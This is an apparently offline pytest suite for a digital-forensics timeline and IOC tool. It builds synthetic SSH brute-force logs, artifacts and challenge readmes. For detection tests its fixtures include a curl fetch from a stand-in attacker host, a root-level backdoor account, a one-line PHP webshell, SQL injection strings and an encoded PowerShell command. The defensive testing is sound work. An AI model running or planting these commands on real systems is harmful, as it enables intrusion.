"""Offline test suite.

CONSTRAINT: every fixture is synthesized in tmp_path. No evidence files, no
network, no optional dependencies — `pytest -q` must pass on a bare
`pip install -e .`, because that is the install a fresh analyst has.

Dependency-bound paths (dissect) are guarded with importorskip so the same suite
gets stronger on a `[full]` install instead of failing on a minimal one.
"""
from __future__ import annotations

import gzip
import json
import zipfile
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from inspecthor import capabilities, reporter
from inspecthor.engine import Engine, discover, open_evidence, sha256_file, sniff
from inspecthor.ioc import extract_iocs, refang
from inspecthor.models import Event, EventFilter, ParseContext, to_utc
from inspecthor.parsers._loader import all_parsers, select_parser
from inspecthor.parsers.base import Parser, register
from inspecthor.query import build_where, parse_time, search, timeline
from inspecthor.store.store import CaseStore

AUTH_LOG = (
    "Mar  1 09:15:01 web01 sshd[1010]: Failed password for admin from 45.33.32.156 port 51234 ssh2\n"
    "Mar  1 09:15:04 web01 sshd[1011]: Failed password for admin from 45.33.32.156 port 51235 ssh2\n"
    "Mar  1 09:15:09 web01 sshd[1012]: Failed password for admin from 45.33.32.156 port 51236 ssh2\n"
    "Mar  1 09:15:14 web01 sshd[1013]: Accepted password for admin from 45.33.32.156 port 51237 ssh2\n"
    "Mar  1 09:16:00 web01 sudo:    admin : TTY=pts/0 ; PWD=/root ; USER=root ; "
    "COMMAND=/usr/bin/curl http://evil.example.net/x.sh\n"
    "Mar  1 09:17:00 web01 useradd[1099]: new user: name=backdoor, UID=0, GID=0\n"
    "Mar  1 09:18:00 web01 sshd[1014]: Accepted publickey for deploy from 10.1.2.3 port 40001 ssh2\n"
)


# ---- fixtures ---------------------------------------------------------------


@pytest.fixture
def evidence(tmp_path: Path) -> Path:
    """A small mixed-evidence directory."""
    root = tmp_path / "evidence"
    root.mkdir()
    (root / "auth.log").write_text(AUTH_LOG)
    with gzip.open(root / "auth.log.1.gz", "wt") as handle:
        handle.write(
            "Feb 28 22:00:00 web01 sshd[900]: Failed password for root from 1.2.3.4 port 1 ssh2\n"
        )
    (root / "access.log").write_text(
        '10.0.0.5 - - [01/Mar/2024:09:20:00 +0000] "GET /shell.php HTTP/1.1" 200 12\n'
    )
    (root / "notes.txt").write_text(
        "beacon to 185[.]220[.]101[.]44\nhxxp://bad[.]tld/payload\n"
        "sha256 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\n"
    )
    (root / "NTUSER.DAT").write_bytes(b"regf" + b"\x00" * 600)
    (root / "Security.evtx").write_bytes(b"ElfFile\x00" + b"\x00" * 600)
    (root / "app.pf").write_bytes(b"MAM\x04" + b"\x00" * 200)
    (root / "old.pf").write_bytes(b"\x11\x00\x00\x00SCCA" + b"\x00" * 200)
    (root / "db.sqlite").write_bytes(b"SQLite format 3\x00" + b"\x00" * 200)
    (root / "cap.pcap").write_bytes(b"\xd4\xc3\xb2\xa1" + b"\x00" * 200)
    return root


@pytest.fixture
def case(tmp_path: Path, evidence: Path) -> CaseStore:
    """An ingested case, ready to query."""
    store = CaseStore(str(tmp_path / "case.db"), case_name="test-case")
    list(Engine(store).ingest(evidence, host="web01", year_hint=2024))
    yield store
    store.close()


# ---- models -----------------------------------------------------------------


def test_to_utc_respects_assumed_tz():
    naive = datetime(2024, 3, 1, 12, 0, 0)
    eastern = timezone(timedelta(hours=-5))
    # A naive time must be read in the case tz, not silently treated as UTC.
    assert to_utc(naive, eastern).hour == 17
    assert to_utc(naive, timezone.utc).hour == 12


def test_event_sort_keys_are_utc():
    event = Event(
        timestamp=datetime(2024, 3, 1, 12, 0, 0, tzinfo=timezone(timedelta(hours=2))),
        timestamp_desc="Logged", message="x",
    )
    assert event.ts_iso() == "2024-03-01 10:00:00"
    assert event.ts_epoch_us() == int(event.utc().timestamp() * 1_000_000)


def test_parse_context_drops_unknown_attck_only_with_a_db():
    ctx = ParseContext(evidence_root=Path("."))
    # No DB loaded: normalize but never invent or discard.
    assert ctx.valid_attck(["t1059", "T1059"]) == ["T1059"]


def test_parse_context_hints_dedupe():
    ctx = ParseContext(evidence_root=Path("."))
    ctx.hint("same")
    ctx.hint("same")
    ctx.hint("other")
    assert ctx.hints == ["same", "other"]


def test_event_severity_is_clamped():
    ctx = ParseContext(evidence_root=Path("."))
    event = ctx.event(
        timestamp=datetime.now(timezone.utc), timestamp_desc="x",
        message="m", severity="catastrophic",
    )
    assert event.severity == "info"


# ---- fingerprinting ---------------------------------------------------------


@pytest.mark.parametrize("filename,expected", [
    ("NTUSER.DAT", "registry"),
    ("Security.evtx", "evtx"),
    ("db.sqlite", "sqlite"),
    ("cap.pcap", "pcap"),
    ("app.pf", "prefetch"),
    ("old.pf", "prefetch"),      # SCCA lives at offset 4, not 0
    ("auth.log", "syslog"),
    ("notes.txt", "text"),
])
def test_sniff_identifies_by_content(evidence: Path, filename: str, expected: str):
    assert sniff(evidence / filename).kind == expected


def test_sniff_handles_missing_file(tmp_path: Path):
    assert sniff(tmp_path / "nope").kind == "unreadable"


def test_discover_skips_dotfiles_and_respects_cap(evidence: Path):
    (evidence / ".hidden").write_text("x")
    found = discover(evidence)
    assert not any(p.name == ".hidden" for p in found)
    assert len(discover(evidence, max_files=3)) == 3


def test_sha256_is_stable(evidence: Path):
    digest = sha256_file(evidence / "auth.log")
    assert len(digest) == 64
    assert digest == sha256_file(evidence / "auth.log")


# ---- archives ---------------------------------------------------------------


def test_open_evidence_extracts_htb_password_zip(tmp_path: Path):
    """The Sherlock password is tried automatically — that is the point."""
    archive = tmp_path / "sherlock.zip"
    with zipfile.ZipFile(archive, "w") as zf:
        zf.writestr("readme.txt", "1) What is the attacker IP?\n")
    root, note = open_evidence(archive, tmp_path / "out")
    assert note == ""
    assert (root / "readme.txt").is_file()


def test_open_evidence_reports_missing_path(tmp_path: Path):
    _root, note = open_evidence(tmp_path / "absent.zip", tmp_path / "o")
    assert "no such evidence path" in note


def test_open_evidence_rejects_oversized_archive(tmp_path: Path, monkeypatch):
    """A zip bomb is refused before anything is written to disk."""
    import inspecthor.engine as engine_mod
    archive = tmp_path / "bomb.zip"
    with zipfile.ZipFile(archive, "w") as zf:
        zf.writestr("a.txt", "x" * 1000)
    monkeypatch.setattr(engine_mod, "_ZIP_MAX_TOTAL", 10)
    dest = tmp_path / "out"
    _root, note = open_evidence(archive, dest)
    assert "expands to" in note
    assert not list(dest.iterdir())


# ---- parser registry --------------------------------------------------------


def test_parsers_register_and_are_stdlib_safe():
    names = {p.name for p in all_parsers()}
    assert {"generic_text", "linux_syslog", "evtx", "registry"} <= names
    for parser in all_parsers():
        if parser.name in ("generic_text", "linux_syslog"):
            assert parser.dependency_ok()[0], f"{parser.name} must need no extras"


def test_specialist_beats_generic_fallback(tmp_path: Path):
    chosen, _ = select_parser(
        tmp_path / "auth.log", b"Mar  1 09:00:00 h sshd[1]: hi", "syslog"
    )
    assert chosen is not None and chosen.name == "linux_syslog"


def test_select_parser_reports_the_missing_dependency(tmp_path: Path):
    """An artifact skipped for a missing extra must say so, not vanish."""

    @register
    class _NeedsMissingLib(Parser):
        name = "needs_missing_lib"
        display = "Fake"
        category = "generic"
        magic = (b"FAKEMAGIC",)
        requires = "definitely_not_installed_xyz"
        install_hint = "pip install 'inspecthor[fake]'"

    try:
        chosen, unavailable = select_parser(
            tmp_path / "x.fake", b"FAKEMAGIC" + b"\x00" * 10, "binary"
        )
        assert chosen is None or chosen.name != "needs_missing_lib"
        assert unavailable is not None and unavailable.name == "needs_missing_lib"
        assert "inspecthor[fake]" in unavailable.dependency_ok()[1]
    finally:
        from inspecthor.parsers.base import _REGISTRY
        _REGISTRY.remove(_NeedsMissingLib)


def test_sniff_exception_does_not_break_selection(tmp_path: Path):
    @register
    class _Exploding(Parser):
        name = "exploding"

        def sniff(self, path, header, kind=""):
            raise RuntimeError("boom")

    try:
        chosen, _ = select_parser(tmp_path / "a.txt", b"plain text here", "text")
        assert chosen is not None and chosen.name == "generic_text"
    finally:
        from inspecthor.parsers.base import _REGISTRY
        _REGISTRY.remove(_Exploding)


# ---- store ------------------------------------------------------------------


def _mk_events(ctx: ParseContext, count: int = 5) -> list[Event]:
    base = datetime(2024, 3, 1, 12, 0, 0, tzinfo=timezone.utc)
    return [
        ctx.event(
            timestamp=base + timedelta(minutes=i), timestamp_desc="Logged",
            message=f"needle event {i} from 10.0.0.{i}", event_type="test_event",
            user="admin", data={"source_ip": f"10.0.0.{i}"}, attck=["T1110.001"],
            severity="high" if i == 0 else "info", source_artifact="unit",
            parser="unit",
        )
        for i in range(count)
    ]


def test_store_bulk_insert_and_timeline_order(tmp_path: Path):
    store = CaseStore(str(tmp_path / "t.db"))
    ctx = ParseContext(evidence_root=tmp_path, host="H")
    assert store.add_events_bulk(_mk_events(ctx), batch=2) == 5
    store.finalize()
    rows = timeline(store)
    assert [r["ts"] for r in rows] == sorted(r["ts"] for r in rows)
    assert isinstance(rows[0]["data"], dict)
    assert rows[0]["attck"] == ["T1110.001"]
    store.close()


def test_store_respects_max_events(tmp_path: Path):
    store = CaseStore(str(tmp_path / "t.db"))
    ctx = ParseContext(evidence_root=tmp_path)
    assert store.add_events_bulk(_mk_events(ctx, 10), batch=2, max_events=4) == 4
    store.close()


def test_artifact_registration_is_idempotent(tmp_path: Path):
    store = CaseStore(str(tmp_path / "t.db"))
    first = store.add_artifact("/e/a.log", "deadbeef", "syslog", 10, "2024-03-01")
    again = store.add_artifact("/e/a.log", "deadbeef", "syslog", 10, "2024-03-01")
    assert first == again
    store.close()


def test_search_works_with_and_without_fts(tmp_path: Path):
    store = CaseStore(str(tmp_path / "t.db"))
    ctx = ParseContext(evidence_root=tmp_path)
    store.add_events_bulk(_mk_events(ctx))
    store.finalize()

    assert store.fts_ok, "FTS5 expected on a standard SQLite build"
    assert len(search(store, "needle")) == 5

    # The LIKE fallback must find the same rows on a build without FTS5.
    store.fts_ok = False
    assert len(search(store, "needle")) == 5
    store.close()


def test_search_survives_malformed_fts_query(tmp_path: Path):
    store = CaseStore(str(tmp_path / "t.db"))
    ctx = ParseContext(evidence_root=tmp_path)
    store.add_events_bulk(_mk_events(ctx))
    store.finalize()
    # An unbalanced quote is a MATCH syntax error; it must degrade, not raise.
    assert search(store, 'needle"') is not None
    store.close()


def test_regex_search_and_bad_pattern(tmp_path: Path):
    store = CaseStore(str(tmp_path / "t.db"))
    ctx = ParseContext(evidence_root=tmp_path)
    store.add_events_bulk(_mk_events(ctx))
    store.finalize()
    assert len(search(store, r"10\.0\.0\.[12]", regex=True)) == 2
    with pytest.raises(ValueError):
        search(store, "([unclosed", regex=True)
    store.close()


def test_facets_reject_unknown_columns(tmp_path: Path):
    store = CaseStore(str(tmp_path / "t.db"))
    with pytest.raises(ValueError):
        store.facets("message; DROP TABLE events")
    store.close()


def test_build_where_is_parameterized():
    where, params = build_where(EventFilter(host="a'; DROP TABLE events;--", limit=5))
    assert "?" in where
    assert params == ["a'; DROP TABLE events;--"]
    assert "DROP" not in where


def test_source_artifact_filter_matches_family(tmp_path: Path):
    store = CaseStore(str(tmp_path / "t.db"))
    ctx = ParseContext(evidence_root=tmp_path)
    store.add_events_bulk([
        ctx.event(timestamp=datetime.now(timezone.utc), timestamp_desc="d",
                  message="m", source_artifact="evtx/Security"),
    ])
    store.finalize()
    # A bare 'evtx' should match the whole channel family.
    assert len(store.query_events(EventFilter(source_artifact="evtx"))) == 1
    store.close()


def test_parse_time_accepts_common_forms_and_rejects_junk():
    assert parse_time("2024-03-01").hour == 0
    assert parse_time("2024-03-01 09:15:14").minute == 15
    with pytest.raises(ValueError):
        parse_time("last tuesday")


def test_parse_tz_handles_names_offsets_and_junk():
    from inspecthor.query import parse_tz
    assert parse_tz("UTC") is timezone.utc
    assert parse_tz("") is timezone.utc
    assert parse_tz("-06:00").utcoffset(None) == timedelta(hours=-6)
    assert parse_tz("+0530").utcoffset(None) == timedelta(hours=5, minutes=30)
    # A bad zone must be refused, never silently downgraded to UTC — that would
    # shift every naive event while appearing to work.
    with pytest.raises(ValueError):
        parse_tz("Mars/Olympus_Mons")


def test_tz_actually_shifts_naive_syslog_times(tmp_path: Path):
    """Regression: --tz was accepted and then ignored, hardcoded to UTC.

    A naive 'Mar  1 09:15:01' read as US Central is 15:15:01 UTC.
    """
    from inspecthor.query import parse_tz
    root = tmp_path / "ev"
    root.mkdir()
    (root / "auth.log").write_text(
        "Mar  1 09:15:01 web01 sshd[1]: Failed password for admin from 8.8.8.8 port 1 ssh2\n"
    )

    utc_store = CaseStore(str(tmp_path / "utc.db"))
    list(Engine(utc_store).ingest(root, year_hint=2024, tz=timezone.utc))
    utc_ts = timeline(utc_store)[0]["ts"]
    utc_store.close()

    central_store = CaseStore(str(tmp_path / "central.db"))
    list(Engine(central_store).ingest(
        root, year_hint=2024, tz=parse_tz("America/Chicago")
    ))
    central_ts = timeline(central_store)[0]["ts"]
    central_store.close()

    assert utc_ts == "2024-03-01 09:15:01"
    assert central_ts == "2024-03-01 15:15:01"


# ---- parsers ----------------------------------------------------------------


def test_linux_syslog_correlates_brute_force(case: CaseStore):
    """Failures then a PASSWORD success for the same account is the story."""
    hits = case.query_events(EventFilter(tag="brute_force_success"))
    assert len(hits) == 1
    assert hits[0]["data"]["prior_failures"] == 3
    assert "T1110.001" in hits[0]["attck"]
    assert hits[0]["severity"] == "high"


def test_publickey_success_is_not_called_brute_force(case: CaseStore):
    """An agent trying keys first is normal; flagging it would cry wolf."""
    rows = case.query_events(EventFilter(user="deploy"))
    assert rows and all("Brute-force" not in r["message"] for r in rows)


def test_syslog_year_inference(case: CaseStore):
    rows = case.query_events(EventFilter(user="root"))
    assert rows and rows[0]["ts"].startswith("2024-02-28")


def test_account_creation_is_high_severity(case: CaseStore):
    rows = [r for r in case.query_events(EventFilter(event_type="account_created"))]
    assert len(rows) == 1
    assert rows[0]["user"] == "backdoor"
    assert rows[0]["severity"] == "high"


def test_suspicious_sudo_command_escalates(case: CaseStore):
    rows = case.query_events(EventFilter(event_type="sudo_command"))
    assert rows and "T1105" in rows[0]["attck"]


def test_generic_text_parses_clf_timestamps(case: CaseStore):
    rows = case.query_events(EventFilter(source_artifact="generic_text"))
    assert any(r["ts"] == "2024-03-01 09:20:00" for r in rows)


def test_untimestamped_file_still_reaches_the_case(case: CaseStore):
    """An unparsed file is an invisible file — the fallback prevents that."""
    rows = case.query_events(EventFilter(event_type="text_artifact"))
    assert rows and any("notes.txt" in r["message"] for r in rows)


def test_bad_artifact_does_not_abort_ingest(case: CaseStore):
    """The truncated hive/evtx fixtures must not stop the good files parsing."""
    artifacts = {Path(a["path"]).name: a for a in case.get_artifacts()}
    assert artifacts["auth.log"]["status"] == "parsed"
    assert artifacts["NTUSER.DAT"]["status"] in ("parsed", "error", "unsupported")
    assert case.count_events() > 0


def test_unsupported_artifact_records_a_hint_when_dep_missing(tmp_path: Path):
    """Without dissect installed, a hive should still explain itself."""
    if capabilities.available("registry"):
        pytest.skip("dissect.regf present, so the file is parsed rather than skipped")
    root = tmp_path / "ev"
    root.mkdir()
    (root / "SYSTEM").write_bytes(b"regf" + b"\x00" * 600)
    store = CaseStore(str(tmp_path / "c.db"))
    results = list(Engine(store).ingest(root))
    assert results[0].status == "unsupported"
    assert "inspecthor[registry]" in results[0].hint
    store.close()


# ---- iocs -------------------------------------------------------------------


def test_refang_undoes_report_style_defanging():
    assert refang("hxxp://bad[.]tld/x") == "http://bad.tld/x"
    assert refang("1[.]2[.]3[.]4") == "1.2.3.4"
    assert refang("a[at]b[.]com") == "a@b.com"


def test_extract_iocs_finds_defanged_indicators():
    found = extract_iocs("beacon to 185[.]220[.]101[.]44 via hxxp://bad[.]tld/p")
    values = {value for _kind, value, _tags in found}
    assert "185.220.101.44" in values
    assert any(v.startswith("http://bad.tld") for v in values)


def test_private_addresses_are_tagged_not_dropped():
    found = extract_iocs("connect 10.0.0.5 and 8.8.8.8")
    tagged = {value: tags for _kind, value, tags in found}
    assert "private" in tagged["10.0.0.5"]
    assert "private" not in tagged["8.8.8.8"]


def test_filenames_are_not_reported_as_domains():
    found = extract_iocs("dropped evil.exe and payload.dll into temp")
    assert not any(kind == "domain" for kind, _v, _t in found)


def test_hashes_are_typed_by_length():
    text = ("d41d8cd98f00b204e9800998ecf8427e "
            "da39a3ee5e6b4b0d3255bfef95601890afd80709 "
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")
    kinds = {kind for kind, _v, _t in extract_iocs(text)}
    assert {"md5", "sha1", "sha256"} <= kinds


def test_allowlisted_domains_are_tagged():
    found = extract_iocs("checked windowsupdate.com then evil-c2.net")
    tagged = {value: tags for _kind, value, tags in found}
    assert "allowlisted" in tagged.get("windowsupdate.com", [])
    assert "allowlisted" not in tagged.get("evil-c2.net", [])


def test_ioc_sweep_links_indicators_to_events(case: CaseStore):
    from inspecthor.ioc import IocSweeper
    counts = IocSweeper(case).sweep()
    assert counts.get("ipv4", 0) >= 2
    values = {row["value"] for row in case.get_iocs()}
    assert "45.33.32.156" in values
    linked = case.conn.execute("SELECT COUNT(*) AS n FROM ioc_hits").fetchone()["n"]
    assert linked > 0


# ---- exporters --------------------------------------------------------------


def test_timesketch_export_has_the_required_columns(case: CaseStore, tmp_path: Path):
    out = reporter.to_timesketch_csv(timeline(case), tmp_path / "ts.csv")
    header = Path(out).read_text(encoding="utf-8").splitlines()[0]
    for required in ("message", "datetime", "timestamp_desc"):
        assert required in header


def test_l2tcsv_export_has_all_seventeen_columns(case: CaseStore, tmp_path: Path):
    out = reporter.to_l2tcsv(timeline(case), tmp_path / "l2t.csv")
    header = Path(out).read_text(encoding="utf-8").splitlines()[0].split(",")
    assert len(header) == 17
    assert header[0] == "date" and header[-1] == "extra"


def test_jsonl_export_is_one_object_per_line(case: CaseStore, tmp_path: Path):
    out = reporter.to_jsonl(timeline(case), tmp_path / "t.jsonl")
    lines = Path(out).read_text(encoding="utf-8").strip().splitlines()
    assert lines and all(json.loads(line)["ts"] for line in lines)


def test_export_rejects_unknown_format(case: CaseStore, tmp_path: Path):
    with pytest.raises(ValueError):
        reporter.export(timeline(case), tmp_path / "x", "parquet")


def test_markdown_report_covers_the_case(case: CaseStore):
    text = reporter.markdown_report(case)
    assert "# Case report" in text
    assert "Brute-force SUCCESS" in text
    assert "## Artifacts" in text


# ---- att&ck -----------------------------------------------------------------


def test_attack_db_validates_ids():
    from inspecthor.attack import AttackDB
    db = AttackDB()
    if not db.loaded:
        pytest.skip("no bundled ATT&CK database available")
    assert db.valid(["T1110.001", "T9999.999", "t1059"]) == ["T1110.001", "T1059"]
    assert db.name_of("T1059")


# ---- sherlock ---------------------------------------------------------------


def test_questions_extracted_from_numbered_readme(tmp_path: Path):
    from inspecthor.sherlock import questions_from_file
    readme = tmp_path / "readme.txt"
    readme.write_text(
        "Scenario: something happened.\n"
        "1) What is the attacker's IP address?\n"
        "2. Which account was compromised?\n"
        "3 - When did the attacker first log in?\n"
    )
    questions = questions_from_file(readme)
    assert len(questions) == 3
    assert "attacker's IP" in questions[0]


def test_sherlock_suggests_the_attacker_ip(case: CaseStore):
    from inspecthor.sherlock import answer_question
    candidates = answer_question(case, "What is the attacker's IP address?")
    assert candidates
    assert candidates[0].answer == "45.33.32.156"
    assert candidates[0].confidence > 0.5


def test_sherlock_suggests_created_account(case: CaseStore):
    from inspecthor.sherlock import answer_question
    candidates = answer_question(case, "What account did the attacker create?")
    assert any(c.answer == "backdoor" for c in candidates)


def test_sherlock_formats_timestamps_the_way_htb_wants(case: CaseStore):
    from inspecthor.sherlock import answer_question, fmt_hash, fmt_int, fmt_utc
    assert fmt_utc("2024-03-01T09:15:14+00:00") == "2024-03-01 09:15:14"
    assert fmt_hash("abc123") == "ABC123"
    assert fmt_int("1,024") == "1024"
    candidates = answer_question(case, "When did the brute force succeed?")
    assert candidates
    datetime.strptime(candidates[0].answer, "%Y-%m-%d %H:%M:%S")


def test_sherlock_overview_runs_without_a_question(case: CaseStore):
    from inspecthor.sherlock import overview
    candidates = overview(case)
    assert any(c.answer == "45.33.32.156" for c in candidates)


def test_sherlock_returns_nothing_for_an_unmappable_question(case: CaseStore):
    from inspecthor.sherlock import answer_question
    assert answer_question(case, "what is the airspeed velocity of a swallow") == []


# ---- detection --------------------------------------------------------------


def test_detectors_degrade_without_their_libraries():
    from inspecthor.detect.sigma_eval import SigmaEval
    from inspecthor.detect.yara_scan import YaraScan
    for detector in (YaraScan(), SigmaEval()):
        ok, hint = detector.available()
        assert ok or hint, "an unavailable detector must explain how to install it"


def test_sigma_condition_evaluator_handles_the_supported_subset():
    from inspecthor.detect.sigma_eval import _Condition
    names = ["selection", "filter", "sel_a", "sel_b"]
    assert _Condition("selection and not filter", names).evaluate(
        {"selection": True, "filter": False}
    )
    assert not _Condition("selection and not filter", names).evaluate(
        {"selection": True, "filter": True}
    )
    assert _Condition("1 of sel_*", names).evaluate({"sel_a": False, "sel_b": True})
    assert not _Condition("all of sel_*", names).evaluate({"sel_a": False, "sel_b": True})


def test_sigma_field_matching_reaches_normalized_data():
    from inspecthor.detect.sigma_eval import _match_map
    row = {"data": {"cmdline": "powershell -enc AAAA", "event_id": "4688"},
           "user": "admin", "message": "x"}
    assert _match_map(row, {"CommandLine|contains": "-enc"})
    assert _match_map(row, {"EventID": "4688"})
    assert _match_map(row, {"TargetUserName": "admin"})
    assert not _match_map(row, {"CommandLine|contains": "notpresent"})


def test_sigma_unknown_modifier_is_refused_not_guessed():
    from inspecthor.detect.sigma_eval import _match_map
    with pytest.raises(NotImplementedError):
        _match_map({"data": {}}, {"CommandLine|utf16le|base64offset|nonsense": "x"})


def test_sigma_rules_fire_on_the_case(case: CaseStore, tmp_path: Path):
    pytest.importorskip("yaml")
    from inspecthor.detect.sigma_eval import SigmaEval
    ctx = ParseContext(evidence_root=tmp_path)
    hits = list(SigmaEval().evaluate(case, ctx))
    # The bundled 'SSH Brute Force Succeeded' rule should match the fixture.
    assert any("Brute Force" in str(h.data.get("rule")) for h in hits)


@pytest.mark.parametrize("rule_field", ["title", "detection"])
def test_bundled_sigma_rules_are_wellformed(rule_field: str):
    yaml = pytest.importorskip("yaml")
    from inspecthor.detect.sigma_eval import _bundled_sigma_dir
    directory = _bundled_sigma_dir()
    assert directory is not None
    docs = []
    for path in directory.rglob("*.yml"):
        docs.extend(d for d in yaml.safe_load_all(path.read_text()) if d)
    assert docs
    assert all(rule_field in doc for doc in docs)


def test_yara_rules_compile_when_available():
    yara = pytest.importorskip("yara")
    from inspecthor.detect.yara_scan import _rule_files
    paths = _rule_files()
    assert paths, "bundled YARA rules should be present"
    for path in paths:
        yara.compile(filepath=str(path))


def test_yara_detects_a_planted_webshell(tmp_path: Path):
    pytest.importorskip("yara")
    from inspecthor.detect.yara_scan import YaraScan
    target = tmp_path / "shell.php"
    target.write_text("<?php system($_GET['cmd']); ?>")
    ctx = ParseContext(evidence_root=tmp_path)
    hits = list(YaraScan().scan(target, ctx))
    assert any("Webshell" in str(h.data.get("rule")) for h in hits)


# ---- capabilities -----------------------------------------------------------


def test_capabilities_always_offer_an_install_route():
    for name, ok, unlocks, hint in capabilities.status():
        assert unlocks
        assert ok or hint, f"{name} must say how to install it"


def test_unknown_capability_is_not_claimed_available():
    assert not capabilities.available("teleportation")


def _extras_from_pyproject() -> dict[str, set[str]]:
    """{extra: {requirement names}} read from pyproject, versions stripped."""
    import re as _re
    import tomllib
    from pathlib import Path as _Path

    root = _Path(__file__).resolve().parent.parent / "pyproject.toml"
    data = tomllib.loads(root.read_text(encoding="utf-8"))
    extras = data["project"]["optional-dependencies"]
    return {
        name: {
            _re.split(r"[<>=!\[;\s]", req, maxsplit=1)[0].strip().lower()
            for req in reqs
        }
        for name, reqs in extras.items()
    }


def test_full_extra_contains_every_other_extra():
    """Regression: [full] omitted dissect.esedb.

    It listed dissect.target and trusted that to pull the format libs, but
    dissect.target does not depend on dissect.esedb — so `pip install '.[full]'`
    left the 'ese' capability unavailable while claiming to install everything.
    A 'full' install that quietly omits a capability is worse than no umbrella.
    """
    extras = _extras_from_pyproject()
    assert "full" in extras
    full = extras["full"]
    missing: dict[str, set[str]] = {}
    for name, reqs in extras.items():
        if name == "full":
            continue
        gap = reqs - full
        if gap:
            missing[name] = gap
    assert not missing, f"[full] is missing requirements from other extras: {missing}"


def test_every_capability_names_a_real_extra():
    """A capability's install hint must point at an extra that exists."""
    extras = _extras_from_pyproject()
    unknown = [
        (cap.name, cap.extra)
        for cap in capabilities.CAPABILITIES
        if cap.extra and cap.extra not in extras
    ]
    assert not unknown, f"capabilities naming a nonexistent extra: {unknown}"


def test_install_hints_name_the_extra():
    """Regression: rich ate the '[evtx]' in hints, printing a useless command."""
    hint = capabilities.hint("evtx")
    assert "[evtx]" in hint


def test_evidence_text_is_not_parsed_as_markup(capsys):
    """A command line containing brackets must render verbatim in a table.

    Evidence controls this text; letting rich interpret it both corrupts the
    value and lets the artifact influence terminal rendering.
    """
    from rich.console import Console as RichConsole

    nasty = "cmd.exe /c echo [bold red]owned[/] & dir C:\\[Users]"
    table, _hidden = reporter.timeline_table([{
        "ts": "2024-03-01 00:00:00", "host": "h", "user": "u",
        "event_type": "process_created", "source_artifact": "evtx/Security",
        "message": nasty, "severity": "info",
    }])
    RichConsole(width=240, no_color=True, highlight=False).print(table)
    out = capsys.readouterr().out
    assert "[bold red]" in out and "owned" in out


# ---- dissect-bound ----------------------------------------------------------


def test_evtx_parser_selected_when_dissect_present(tmp_path: Path):
    pytest.importorskip("dissect.eventlog")
    chosen, _ = select_parser(
        tmp_path / "Security.evtx", b"ElfFile\x00" + b"\x00" * 10, "evtx"
    )
    assert chosen is not None and chosen.name == "evtx"


def test_evtx_field_mapping_and_lolbin_escalation():
    pytest.importorskip("dissect.eventlog")
    from inspecthor.parsers.plugins.evtx import _escalate, _family

    assert _family("Microsoft-Windows-Sysmon") == "sysmon"
    assert _family("Microsoft-Windows-Security-Auditing") == "security"
    assert _family("Microsoft-Windows-PowerShell") == "powershell"

    attck, severity = _escalate(
        "powershell -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA", ["T1059"], "info"
    )
    assert "T1059.001" in attck and severity == "high"
    # A benign command line must not be escalated.
    assert _escalate("notepad.exe readme.txt", ["T1059"], "info") == (["T1059"], "info")


def test_registry_hive_type_detection():
    pytest.importorskip("dissect.regf")
    from inspecthor.parsers.plugins.registry_hive import _hive_type
    assert _hive_type(Path("NTUSER.DAT"), set()) == "ntuser"
    assert _hive_type(Path("SYSTEM"), set()) == "system"
    assert _hive_type(Path("Amcache.hve"), set()) == "amcache"
    # Renamed evidence falls back to the root-key layout.
    assert _hive_type(Path("hive_01.bin"), {"Select", "ControlSet001"}) == "system"


def test_userassist_rot13_decoding():
    pytest.importorskip("dissect.regf")
    from inspecthor.parsers.plugins.registry_hive import _userassist_name
    assert _userassist_name("PBZCHGRE") == "COMPUTER"


# ---- cli --------------------------------------------------------------------


def test_cli_version_flag_exits_cleanly():
    from inspecthor.cli import main
    with pytest.raises(SystemExit) as excinfo:
        main(["--version"])
    assert excinfo.value.code == 0


